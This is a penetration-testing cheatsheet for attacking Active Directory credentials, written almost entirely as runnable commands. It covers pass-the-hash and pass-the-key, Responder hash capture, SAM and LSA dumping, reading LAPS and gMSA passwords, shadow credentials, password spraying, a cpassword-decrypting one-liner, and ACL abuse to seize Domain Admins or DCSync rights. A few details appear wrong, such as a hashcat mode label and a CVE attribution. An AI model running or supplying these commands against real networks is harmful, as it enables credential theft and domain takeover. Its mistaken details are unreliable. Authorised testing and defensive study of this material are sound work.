---
title: "Active Directory Credential Attacks Reference"
created: "2026-04-15"
type: reference-note
status: active
tags:
  - active-directory
  - credentials
  - pass-the-hash
  - ntlm
  - laps
  - gmsa
---

# Active Directory Credential Attacks Reference

Reference for credential-based attacks in AD: Pass-the-Hash, Pass-the-Key, Over-Pass-the-Hash, hash capture, LAPS/GMSA, shadow credentials, password spraying, and GPP. See also: [[AD-Kerberos-Attacks]], [[AD-MITM-Relay-Attacks]], [[Mimikatz-Reference]], [[Hash-Cracking-Reference]], [[Active-Directory-Cheatsheet]].

---

## Table of Contents

- [[#Pass-the-Hash (PtH)]]
- [[#Over-Pass-the-Hash (OPtH)]]
- [[#Pass-the-Key]]
- [[#NTLM Hash Capture]]
- [[#SAM Database Dumping]]
- [[#LAPS - Local Administrator Password Solution]]
- [[#GMSA - Group Managed Service Accounts]]
- [[#Shadow Credentials]]
- [[#Password Spraying]]
- [[#GPP (Group Policy Preferences) Passwords]]
- [[#DSRM Credentials]]
- [[#ACL Abuse for Credentials]]

---

## Pass-the-Hash (PtH)

Use NTLM hash directly without knowing the plaintext password.

### Exploitation

```bash
# impacket tools (most versatile)
impacket-psexec corp.local/administrator@<IP> -hashes :NTLMHASH
impacket-psexec corp.local/administrator@<IP> -hashes LMHASH:NTLMHASH
impacket-wmiexec corp.local/administrator@<IP> -hashes :NTLMHASH
impacket-smbexec corp.local/administrator@<IP> -hashes :NTLMHASH
impacket-atexec corp.local/administrator@<IP> -hashes :NTLMHASH "whoami"
impacket-smbclient corp.local/administrator@<IP> -hashes :NTLMHASH

# netexec
netexec smb <IP> -u administrator -H NTLMHASH
netexec smb <CIDR> -u administrator -H NTLMHASH --local-auth  # local account
netexec smb <CIDR> -u administrator -H NTLMHASH -x "whoami"   # execute command
netexec winrm <IP> -u administrator -H NTLMHASH -x "whoami"

# Metasploit
use exploit/windows/smb/psexec
set SMBUser administrator
set SMBPass LMHASH:NTLMHASH
set RHOSTS <IP>
run
```

```powershell
# Mimikatz
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:NTLMHASH
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:NTLMHASH /run:cmd.exe

# Invoke-TheHash (PowerShell)
Invoke-WMIExec -Target <IP> -Domain corp.local -Username administrator -Hash NTLMHASH -Command "whoami"
Invoke-SMBExec -Target <IP> -Domain corp.local -Username administrator -Hash NTLMHASH -Command "whoami"
```

### Extracting SAM Hashes (Local)

```powershell
# netexec
netexec smb <IP> -u administrator -H NTLMHASH --sam
netexec smb <IP> -u administrator -p password --sam

# impacket
impacket-secretsdump corp.local/administrator@<IP> -hashes :NTLMHASH
impacket-secretsdump -sam SAM -system SYSTEM LOCAL  # offline

# Mimikatz
lsadump::sam
```

---

## Over-Pass-the-Hash (OPtH)

Use NTLM hash to request a Kerberos TGT, then use the TGT for authentication.

```bash
# impacket getTGT
impacket-getTGT corp.local/administrator -hashes :NTLMHASH -dc-ip <DC_IP>
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass corp.local/administrator@dc01.corp.local
```

```powershell
# Rubeus
.\Rubeus.exe asktgt /user:administrator /rc4:NTLMHASH /domain:corp.local /dc:<DC_IP> /ptt
.\Rubeus.exe asktgt /user:administrator /rc4:NTLMHASH /domain:corp.local /dc:<DC_IP> /outfile:administrator.kirbi

# Mimikatz
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:NTLMHASH /run:powershell.exe
# Then request TGT in new window:
.\Rubeus.exe asktgt /user:administrator /rc4:NTLMHASH /ptt
```

---

## Pass-the-Key

Use AES128 or AES256 Kerberos keys instead of NTLM hash. More stealthy (uses AES encryption, preferred by DCs).

```bash
# impacket getTGT with AES key
impacket-getTGT corp.local/administrator -aesKey <AES256_KEY> -dc-ip <DC_IP>
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass corp.local/administrator@dc01.corp.local

# impacket ticketer (forge TGT)
impacket-ticketer -aesKey <AES256_KEY> -domain-sid <SID> -domain corp.local administrator
```

```powershell
# Rubeus
.\Rubeus.exe asktgt /user:administrator /aes256:<AES256_KEY> /domain:corp.local /dc:<DC_IP> /ptt
.\Rubeus.exe asktgt /user:administrator /aes128:<AES128_KEY> /domain:corp.local /dc:<DC_IP> /ptt

# Mimikatz
sekurlsa::pth /user:administrator /domain:corp.local /aes256:<AES256_KEY> /run:cmd.exe
```

### Extracting AES Keys

```powershell
# Mimikatz (requires DA or debug rights)
sekurlsa::ekeys

# DCSync (requires Replication rights / DA)
lsadump::dcsync /domain:corp.local /user:administrator
```

---

## NTLM Hash Capture

### NTLMv1 Capture

NTLMv1 is weaker and can be cracked faster. Requires LmCompatibilityLevel ≤ 2 on target.

```bash
# Responder with NTLMv1 challenge
responder -I eth0 -v
# Set challenge to 1122334455667788 for optimized cracking

# Edit Responder config
# Change: Challenge = 1122334455667788
vim /usr/share/responder/Responder.conf

# Crack with shuck.sh (using known NT hash)
# https://github.com/yanncam/ShuckNT

# Crack with hashcat
hashcat -m 5500 ntlmv1.txt /usr/share/wordlists/rockyou.txt  # NTLMv1
hashcat -m 5600 ntlmv1.txt /usr/share/wordlists/rockyou.txt  # NetNTLMv1
```

### NTLMv2 Capture (Responder)

```bash
# Responder - capture NTLMv2 challenges
responder -I eth0 -v -w -F
responder -I eth0 -v --lm    # Downgrade to LM

# Crack NTLMv2
hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## SAM Database Dumping

```powershell
# netexec - remote
netexec smb <IP> -u administrator -p password --sam
netexec smb <IP> -u administrator -p password --lsa  # LSA secrets

# impacket - remote
impacket-secretsdump corp.local/administrator@<IP>

# Local - reg save
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY
# Download and parse offline
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# HiveNightmare / ShadowCoerce (CVE-2021-36934) - no admin needed
icacls C:\Windows\System32\config\SAM
# If readable: extract shadow copy
vssadmin list shadows
```

---

## LAPS - Local Administrator Password Solution

LAPS randomizes local admin passwords per machine and stores them in AD attribute `ms-Mcs-AdmPwd`.

### Checking LAPS Configuration

```powershell
# Check if LAPS is installed
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select Name,ms-Mcs-AdmPwd

# PowerView - find who can read LAPS
Get-NetGPO | ? { $_.DisplayName -like "*LAPS*" }
```

### Reading LAPS Passwords

```powershell
# PowerView (if you have ReadLAPSPassword right)
Get-DomainComputer -Identity workstation01 | Select -ExpandProperty ms-mcs-admpwd

# LAPSToolkit
Find-LAPSDelegatedGroups   # Who can read LAPS
Find-AdmPwdExtendedRights  # Who has extended rights
Get-LAPSComputers          # Computers with LAPS + passwords

# Native AD
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime | Where-Object {$_."ms-Mcs-AdmPwd" -ne $null}
```

```bash
# pyLAPS
python3 pyLAPS.py -u jdoe -p password -d corp.local --dc-ip <DC_IP>

# netexec
netexec ldap <DC_IP> -u jdoe -p password -M laps
netexec ldap <DC_IP> -u jdoe -p password --laps
```

---

## GMSA - Group Managed Service Accounts

gMSA passwords are auto-rotated and stored in `msDS-ManagedPassword`. Specific principals can read this attribute.

### Reading GMSA Passwords

```powershell
# Native PowerShell
$gmsa = Get-ADServiceAccount -Identity "svc-gmsa" -Properties msDS-ManagedPassword
$mp = $gmsa.'msDS-ManagedPassword'
$cred = New-Object System.Management.Automation.PSCredential "corp\svc-gmsa", (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword

# GMSAPasswordReader
.\GMSAPasswordReader.exe --AccountName svc-gmsa

# netexec
netexec ldap <DC_IP> -u jdoe -p password --gmsa
```

```bash
# gMSADumper (Linux)
python3 gMSADumper.py -u jdoe -p password -d corp.local

# impacket
impacket-GetADUsers corp.local/jdoe:password --gmsa
```

### GoldenGMSA - Offline GMSA Password Computation

```powershell
# Dump KDS root key (requires DA)
.\GoldenGMSA.exe kdsinfo

# Compute GMSA password offline
.\GoldenGMSA.exe compute --sid <GMSA_SID>
```

---

## Shadow Credentials

Abuse `msDS-KeyCredentialLink` attribute to add a certificate credential to a user/computer object. Then use PKINIT to authenticate and get NTLM hash.

**Requirements:** Write permission on target object (GenericAll, GenericWrite, Self, WriteDACL)

### Whisker (Windows)

```powershell
# Add shadow credential to target
.\Whisker.exe add /target:victim

# List existing shadow creds
.\Whisker.exe list /target:victim

# Remove shadow cred
.\Whisker.exe remove /target:victim /deviceid:<GUID>
```

### pyWhisker (Linux)

```bash
# Add shadow credential
python3 pywhisker.py -d corp.local -u jdoe -p password --target victim --action add

# Get NTLM hash via PKINIT
# pywhisker generates: python3 gettgtpkinit.py corp.local/victim -pfx-base64 ... victim.ccache
python3 gettgtpkinit.py corp.local/victim -cert-pem victim.pem -key-pem victim_key.pem victim.ccache
export KRB5CCNAME=victim.ccache
python3 getnthash.py corp.local/victim -key <AS-REP-ENC-KEY>
```

### Shadow Credential Relay Attack

1. Use MITM relay attack to get authentication from target
2. Relay to LDAP and add shadow credential to target
3. Authenticate using certificate via PKINIT

```bash
# Start relay that adds shadow creds
ntlmrelayx.py -t ldap://<DC_IP> --shadow-credentials --shadow-target victim --no-dump

# Trigger NTLM authentication from target
```

---

## Password Spraying

Test one or a few passwords against many users. Avoid lockout by staying under lockout threshold.

### Enumeration First

```powershell
# Check password policy
Get-ADDefaultDomainPasswordPolicy
net accounts /domain
```

### Spraying Tools

```bash
# netexec - SMB spray
netexec smb <DC_IP> -u users.txt -p 'Password123!' --no-bruteforce --continue-on-success
netexec smb <DC_IP> -u users.txt -p passwords.txt  # Multiple passwords (careful of lockout)

# netexec - WinRM
netexec winrm <IP> -u users.txt -p 'Password123!'

# kerbrute - Kerberos spray (doesn't trigger standard logon events)
kerbrute passwordspray -d corp.local --dc <DC_IP> users.txt 'Password123!'
kerbrute bruteuser -d corp.local --dc <DC_IP> users.txt passwords.txt

# DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password 'Password123!' -OutFile spray_results.txt
Invoke-DomainPasswordSpray -UserList users.txt -Password 'Password123!'
```

```bash
# sprayhound - auto adjusts to avoid lockout
sprayhound -U users.txt -p 'Password123!' -d corp.local --dc <DC_IP>
```

---

## GPP (Group Policy Preferences) Passwords

MS14-025. Group Policy Preferences could store credentials (cpassword) encrypted with a publicly known AES key.

### Finding GPP Passwords

```bash
# Search SYSVOL manually
findstr /S /I cpassword \\corp.local\sysvol\corp.local\policies\*.xml

# smbclient
smbclient //dc01.corp.local/SYSVOL -U 'corp\jdoe%password' -c 'recurse; ls'

# netexec modules
netexec smb <DC_IP> -u jdoe -p password -M gpp_password
netexec smb <DC_IP> -u jdoe -p password -M gpp_autologin
```

```powershell
# PowerSploit Get-GPPPassword
Get-GPPPassword
Get-GPPAutologon

# PowerView
Get-NetGPO | Select displayname,gpcfilesyspath
```

### Decrypting cpassword

```bash
# gpp-decrypt
gpp-decrypt AES_ENCRYPTED_STRING

# Python one-liner (AES-256 CBC, key is publicly known)
python3 -c "import base64,pyaes; key=b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'; print(pyaes.AESModeOfOperationCBC(key, iv=b'\x00'*16).decrypt(base64.b64decode(input('cpassword: ')+b'====')).decode('utf-16-le').rstrip())"
```

---

## DSRM Credentials

Directory Services Restore Mode password. Local admin account on DCs when in DSRM mode.

```powershell
# Extract DSRM hash (requires DA)
# Mimikatz
lsadump::sam

# Dump remotely (secretsdump)
impacket-secretsdump corp.local/administrator@<DC_IP>

# Enable DSRM login remotely
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

# Pass-the-Hash with DSRM (use local prefix)
impacket-psexec .\\Administrator@<DC_IP> -hashes :DSRM_HASH
```

---

## ACL Abuse for Credentials

When you have specific ACE rights, escalate or extract credentials.

### GenericAll on User - Reset Password

```powershell
# PowerView
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) -Verbose

# AD Module
Set-ADAccountPassword -Identity victim -Reset -NewPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# net rpc
net rpc password victim NewPass123! -U "corp.local\jdoe%password" -S <DC_IP>
```

### GenericAll on Group - Add to Group

```powershell
# PowerView
Add-DomainGroupMember -Identity "Domain Admins" -Members jdoe -Verbose

# AD Module
Add-ADGroupMember -Identity "Domain Admins" -Members jdoe

# net
net group "Domain Admins" jdoe /add /domain
```

### WriteDACL - Grant DCSync Rights

```powershell
# PowerView - add DCSync rights to user
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity jdoe -Rights DCSync -Verbose

# Then DCSync
impacket-secretsdump corp.local/jdoe:password@<DC_IP>
```

### GenericWrite on User - Targeted Kerberoasting

```powershell
# Add SPN to user, Kerberoast, remove SPN
Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/spn'}
.\Rubeus.exe kerberoast /user:victim /format:hashcat
Set-DomainObject -Identity victim -Clear serviceprincipalname
```
